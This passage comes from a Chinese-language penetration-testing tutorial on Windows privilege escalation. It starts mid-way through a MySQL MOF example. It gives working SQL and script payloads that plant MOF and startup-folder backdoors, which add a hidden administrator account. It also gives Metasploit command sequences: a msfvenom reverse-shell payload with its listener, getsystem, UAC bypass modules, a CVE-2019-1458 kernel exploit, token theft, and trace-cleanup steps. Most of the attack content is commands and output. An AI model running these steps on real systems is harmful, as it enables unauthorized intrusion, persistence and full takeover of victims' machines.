      ScriptingEngine = "JScript";
    # 执行命令,新建用户naraku
      ScriptText = "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user naraku 123456 /add\")";
    };
    instance of __FilterToConsumerBinding {
      Consumer = $Consumer;
      Filter = $EventFilter;
    };
##### 提权步骤
  * 将上面的脚本上传到有读写权限的目录下，如：`C:/xxx/`
  * 使用sql语句将文件导入到`c:/windows/system32/wbem/mof/`下
    * 这里不能使用`outfile`，因为会在末端写入新行，而MOF在被当作二进制文件时无法正常执行，所以需要用`dumpfile`导出一行数据。
    select load_file("C:/xxx/test.mof") into dumpfile "c:/windows/system32/wbem/mof/nullevt.mof"
  * 当我们成功把MOF导出时，mof就会直接被执行，且5秒创建一次用户
##### 痕迹清除
  * 提权成功后，就算被删号，MOF也会在五秒内将原账号重建，如果要删除入侵账号可以执行以下命令：
    $ net stop winmgmt
    $ del c:/windows/system32/wbem/repository
    $ net start winmgmt
  * 然后重启服务即可
#### 启动项提权
  * 已知root密码
  * `file_priv`不为`null`
    create table a (cmd text); 
    insert into a values ("set wshshell=createobject (""wscript.shell"") " ); 
    insert into a values ("a=wshshell.run (""cmd.exe /c net user naraku 123456 /add"",0) " ); 
    insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators naraku /add"",0) " ); 
    select * from a into outfile "C:\\Documents and Settings\\All Users\\“开始”菜单\\程序\\启动\\a.vbs";
### MSSQL
  * 前提：拿到SA密码
#### 利用方式
  * 传统`xp_cmdshell`利用
    * `xp_cmdshell`被删如何恢复
  * 借助COM组件执行命令
  * 借助CLR执行命令（类似MySQL UDF）
  * 本地Hash注入+端口转发/Socks实现无密码连接目标内网MSSQL
  * 利用Windows访问令牌实现无密码连接目标内网MSSQL
### Oracle
  * 通常情况下Oracle服务的运行权限都非常高
  * MSF下各类自动化利用模块
  * 通常情况下，Oracle服务的运行权限都比较高
## MSF提权
  * 注意以下命令执行时的状态
    * `$`：Linux命令行下
    * `msf`：进入MSF控制台
    * `meterpreter`：进入某个`session`
    # 生成木马并放入靶机
    $ msfvenom -p windows/meterpreter_reverse_tcp lhost= lport= -f exe -o /tmp/win.exe
    # 攻击机监听
    $ msfconsole
    msf> use exploit/multi/handler 
    msf> set payload windows/meterpreter_reverse_tcp
    msf> set lhost 
    msf> set lport 
    msf> exploit
    # 靶机运行,此时攻击机MSF会接收到反弹的Shell,在MSF中运行shell命令
    meterpreter> shell 
    C:\Users\Naraku\Desktop>whoami
    naraku-win7\naraku
    # 出现中文乱码可运行
    # C:\Users\Naraku\Desktop>chcp 65001
### GetSystem
  * 直接运行`getsystem`
    meterpreter> getsystem
### BypassUAC
  * 相关脚本
    * `use exploit/windows/local/bypassuac`
    * `use exploit/windows/local/bypassuac_injection`
    * `use windows/local/bypassuac_vbs`
    * `use windows/local/ask`
    meterpreter> background  # 后台session 
    msf> use exploit/windows/local/bypassuac
    msf> set SESSION   
    # 后台session时会返回session_id,如不清楚可以使用命令sessions -l
    msf> run
### 内核提权
  * 这里查询补丁跟前面`systeminfo`一样，配合[提权辅助平台 - 漏洞编号](https://i.hacking8.com/tiquan/)查询可利用漏洞编号
    # 查询补丁
    meterpreter> run post/windows/gather/enum_patches 
    [+] KB2999226 installed on 11/25/2020
    [+] KB976902 installed on 11/21/2010
  * 也可以使用`local_exploit_suggester`查询哪些Exp可以利用。
    # 查询Exp
    msf> use post/multi/recon/local_exploit_suggester 
    msf> set LHOST 
    msf> set SESSION 
    msf> run
  * 这里将上一步查询到的Exp打了一遍发现都没有成功，回头一看发现 **原来是系统位数的原因** 。这里的`Meterpreter`运行在32位，而系统位数为64位。
  * 因此需要做进程迁移，将`Meterpreter`迁移到一个64位的进程。
    meterpreter> sysinfo         # 查看位数
    meterpreter> ps              # 查看进程
    meterpreter > migrate   # 进程迁移
  * 重复前面使用`local_exploit_suggester`那一步，可以看到现在查询的是64位的Exp
  * 这里选择选个比较新的`CVE_2019_1458`
    msf> use exploit/windows/local/cve_2019_1458_wizardopium 
    msf> set SESSION 
    msf> run
    meterpreter> getuid
    Server username: NT AUTHORITY\SYSTEM
### 令牌操纵
  * `incognito`假冒令牌
    meterpreter> use incognito                                  
    meterpreter> list_tokens -u                          # 查看可用的token
    meterpreter> impersonate_token 'NT AUTHORITY\SYSTEM' # 假冒SYSTEM token
    meterpreter> execute -f cmd.exe -i –t                # -t使用假冒的token 执行
    meterpreter> rev2self                               # 返回原始token
  * `steal_token`窃取令牌
    meterpreter> ps                 # 查看进程
    meterpreter> steal_token   # 从指定进程中窃取token
    meterpreter> drop_token         # 删除窃取的token
### SMB系列RCE
> 基本绝迹
  * MS08-067
  * MS17-010
## 参考
  * [系统提权入门思维导图](https://huntingday.github.io/img/Localprivilege.png)
  * [MySQL之UDF提权](https://www.cnblogs.com/3ichae1/p/12909952.html)
  * [内网渗透之——MySQL数据库提权之——UDF提权](https://blog.csdn.net/wsnbbz/article/details/104802100)
  * [MySQL提权总结](https://gwjczwy.github.io/2020/07/20/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/)
  * [Windows下三种MySQL提权剖析](https://xz.aliyun.com/t/2719#toc-14)
  * [Metasploit的一些提权方法](https://blog.csdn.net/qq_42349134/article/details/100657705)